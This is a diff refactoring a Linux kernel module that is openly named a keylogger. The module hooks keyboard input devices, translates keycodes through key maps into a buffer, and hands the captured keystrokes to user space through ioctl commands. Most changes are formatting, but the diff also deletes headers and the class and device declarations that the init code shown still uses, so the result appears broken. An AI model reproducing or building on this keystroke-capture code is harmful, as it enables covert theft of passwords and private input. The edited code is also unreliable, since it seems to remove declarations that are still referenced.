@@ -1,16 +1,7 @@
 #include "keylogger.h"
 
-#include <linux/cdev.h>
-#include <linux/device.h>
-#include <linux/fs.h>
 #include <linux/init.h>
-#include <linux/input.h>
-#include <linux/ioctl.h>
 #include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/mutex.h>
-#include <linux/slab.h>
-#include <linux/uaccess.h>
 
 #define DEBUG_MSG(fmt, ...)                                    \
 	do {                                                   \
@@ -23,7 +14,6 @@ module_param(debug_enabled, int, 0644);
 MODULE_PARM_DESC(debug_enabled, "Enable debug output");
 
 static char *buffer;
-
 static int major_device_number;
 static int shift_pressed = 0;
 static int buffer_size = 16;
@@ -32,8 +22,6 @@ static int buffer_index_to_write = 0;
 static DEFINE_MUTEX(buffer_mutex);
 
 static struct input_handler *event_handler;
-static struct class *keylogger_class = NULL;
-static struct device *keylogger_device = NULL;
 
 char map[MAP_SIZE] = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";
 char shift_map[MAP_SIZE] =
@@ -52,6 +40,7 @@ static const struct input_device_id keylogger_id_table[] = {
 	{},
 };
 
+// ----------------- Buffer Management -----------------
 static int allocate_buffer(int size)
 {
 	DEBUG_MSG("[INFO] starting to allocate the buffer...\n");
@@ -82,34 +71,34 @@ static void free_buffer(void)
 	buffer_index_to_write = 0;
 }
 
+// ----------------- IOCTL Handling -----------------
 static long keylogger_ioctl(struct file *file, unsigned int cmd,
 			    unsigned long arg)
 {
 	switch (cmd) {
 	case IOCTL_GET_BUFFER_SIZE:
 		if (put_user(buffer_size, (int __user *)arg)) {
-			DEBUG_MSG("[ERROR] failed to copy buffer size to user "
-				  "space\n");
+			DEBUG_MSG(
+				"[ERROR] failed to copy buffer size to user space\n");
 			return -EFAULT;
 		}
 		return 0;
 
 	case IOCTL_GET_BUFFER_DATA:
 		if (!buffer || buffer_size <= 0) {
-			DEBUG_MSG("[ERROR] buffer is not allocated or has "
-				  "invalid size\n");
+			DEBUG_MSG(
+				"[ERROR] buffer is not allocated or has invalid size\n");
 			return -EINVAL;
 		}
 		if (copy_to_user((char __user *)arg, buffer, buffer_size)) {
-			DEBUG_MSG("[ERROR] failed to copy buffer data to user "
-				  "space\n");
+			DEBUG_MSG(
+				"[ERROR] failed to copy buffer data to user space\n");
 			return -EFAULT;
 		}
 		return 0;
 
 	case IOCTL_SET_BUFFER_SIZE: {
 		int new_size;
-
 		if (get_user(new_size, (int __user *)arg)) {
 			DEBUG_MSG(
 				"[ERROR] failed to get new buffer size from user space\n");
@@ -123,7 +112,6 @@ static long keylogger_ioctl(struct file *file, unsigned int cmd,
 		}
 
 		free_buffer();
-
 		if (allocate_buffer(new_size) < 0) {
 			DEBUG_MSG("[ERROR] failed to allocate new buffer\n");
 			return -ENOMEM;
@@ -132,7 +120,7 @@ static long keylogger_ioctl(struct file *file, unsigned int cmd,
 		return 0;
 	}
 
-	case IOCTL_CLEAR_BUFFER_DATA: {
+	case IOCTL_CLEAR_BUFFER_DATA:
 		mutex_lock(&buffer_mutex);
 		if (buffer) {
 			memset(buffer, 0, buffer_size);
@@ -141,7 +129,6 @@ static long keylogger_ioctl(struct file *file, unsigned int cmd,
 		}
 		mutex_unlock(&buffer_mutex);
 		return 0;
-	}
 
 	default:
 		DEBUG_MSG("[ERROR] unsupported IOCTL command: %u\n", cmd);
@@ -149,6 +136,7 @@ static long keylogger_ioctl(struct file *file, unsigned int cmd,
 	}
 }
 
+// ----------------- Input Handler -----------------
 static int keylogger_connect(struct input_handler *handler,
 			     struct input_dev *dev,
 			     const struct input_device_id *id)
@@ -183,17 +171,15 @@ static int keylogger_connect(struct input_handler *handler,
 		return error;
 	}
 
-	DEBUG_MSG("[INFO] successfully connected and registered handle for "
-		  "device %s\n",
-		  dev->name);
-
+	DEBUG_MSG(
+		"[INFO] successfully connected and registered handle for device %s\n",
+		dev->name);
 	return 0;
 }
 
 static void keylogger_disconnect(struct input_handle *handle)
 {
 	DEBUG_MSG("[INFO] device disconnected: %s\n", handle->dev->name);
-
 	input_close_device(handle);
 	input_unregister_handle(handle);
 	kfree(handle);
@@ -231,7 +217,7 @@ static void keylogger_event_handler(struct input_handle *handle,
 	}
 }
 
-// ------------------------------ init / exit ------------------------------ //
+// ----------------- Module Init/Exit -----------------
 static int __init keylogger_init(void)
 {
 	int error;
@@ -294,9 +280,9 @@ static int __init keylogger_init(void)
 		device_destroy(keylogger_class, MKDEV(major_device_number, 0));
 		class_destroy(keylogger_class);
 		unregister_chrdev(major_device_number, DEVICE_NAME);
-		DEBUG_MSG("[ERROR] failed to register input handler, error "
-			  "code: %d\n",
-			  error);
+		DEBUG_MSG(
+			"[ERROR] failed to register input handler, error code: %d\n",
+			error);
 		return error;
 	}
 
